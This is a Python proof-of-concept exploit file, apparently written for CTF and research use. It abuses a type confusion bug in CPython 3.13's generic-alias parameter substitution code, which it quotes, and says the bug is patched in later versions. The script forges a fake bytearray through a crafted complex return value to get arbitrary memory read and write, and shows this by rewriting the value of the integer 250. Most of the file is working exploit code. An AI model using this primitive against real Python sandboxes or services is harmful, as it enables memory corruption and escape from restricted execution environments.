"""
Author: @Nico-Posada
Bug Credits: @Nico-Posada
"""

# TLDR: Abuse type confusion bug where it assumes any value we return is a tuple without doing checks
# Tested to work on 3.13.0, 3.13.1 (Patched in 3.13.8/3.14.0)

# Fun fact, this is the bug I used to solve Paper Viper from KalmarCTF 2025 (probably a bit overkill ngl)
# https://github.com/kalmarunionenctf/kalmarctf/tree/main/2025/misc/paper-viper

# Here is the vulnerable code as of 3.13.1
# https://github.com/python/cpython/blob/v3.13.1/Objects/genericaliasobject.c#L433-L537
"""
PyObject *
_Py_subs_parameters(PyObject *self, PyObject *args, PyObject *parameters, PyObject *item)
{
    /* snip */

    for (Py_ssize_t iarg = 0, jarg = 0; iarg < nargs; iarg++) {
        PyObject *arg = PyTuple_GET_ITEM(args, iarg);
        if (PyType_Check(arg)) {
            PyTuple_SET_ITEM(newargs, jarg, Py_NewRef(arg));
            jarg++;
            continue;
        }

        int unpack = _is_unpacked_typevartuple(arg); // <--- checks if __typing_is_unpacked_typevartuple__ is True
        if (unpack < 0) {
            Py_DECREF(newargs);
            Py_DECREF(item);
            return NULL;
        }
        PyObject *subst;
        if (PyObject_GetOptionalAttr(arg, &_Py_ID(__typing_subst__), &subst) < 0) { // <--- grabs func here
            Py_DECREF(newargs);
            Py_DECREF(item);
            return NULL;
        }
        if (subst) {
            Py_ssize_t iparam = tuple_index(parameters, nparams, arg);
            assert(iparam >= 0);
            arg = PyObject_CallOneArg(subst, argitems[iparam]); // <--- calls function here, `arg` gets set to whatever we return
            Py_DECREF(subst);
        }
        else {
            arg = subs_tvars(arg, parameters, argitems, nitems);
        }
        if (arg == NULL) {
            Py_DECREF(newargs);
            Py_DECREF(item);
            return NULL;
        }
        if (unpack) { // <--- this must be true so we can access the vulnerable section which is why we set __typing_is_unpacked_typevartuple__
            jarg = tuple_extend(&newargs, jarg,
                    &PyTuple_GET_ITEM(arg, 0), PyTuple_GET_SIZE(arg)); // <--- this here assumes `arg` is a tuple without doing any checks
            Py_DECREF(arg);
            if (jarg < 0) {
                Py_DECREF(item);
                return NULL;
            }
        }
        else {
            PyTuple_SET_ITEM(newargs, jarg, arg);
            jarg++;
        }
    }

    Py_DECREF(item);
    return newargs;
}
"""

# so to exploit this, we can use the `complex` type which allows setting an arbitrary tuple size and
# an arbitrary ob_item[0] when abusing type confusion bugs like this

class evil:
    __typing_is_unpacked_typevartuple__ = True

    def __typing_subst__(self, _unused):
        i2f = lambda num: 5e-324 * num
        fake_ob_size = i2f(1) # set ob_size to 1 so it only extends the args with our fake ba obj
        fake_ob_item = i2f(id(fake_ba) + bytes.__basicsize__ - 1) # will be interpreted as ob_item[0]

        # doing this is the same as `return complex(fake_ob_size, fake_ob_item)`
        return fake_ob_size + 1j * fake_ob_item

p64 = lambda num: num.to_bytes(8, 'little')
fake_ba = (
    p64(0x12345) +
    p64(id(bytearray)) +
    p64(2**63 - 1) +
    p64(2**63 - 1) +
    p64(0) + p64(0)
)

mem = list[evil()]["anything"].__args__[0]

# NOTE: You may have noticed that the CPython code uses normal getattr funcs which
# means you can pull off this setup with something like:
"""
i2f = lambda num: 5e-324 * num
evil = lambda: ...
evil.__typing_is_unpacked_typevartuple__ = True
evil.__typing_subst__ = lambda _unused: i2f(1) + 1j * i2f(id(fake_ba) + bytes.__basicsize__ - 1)
mem = list[evil]["anything"].__args__[0]
"""

print(type(mem))
print(hex(len(mem)))

mem[id(250) + int.__basicsize__] = 100
print(250) # => 100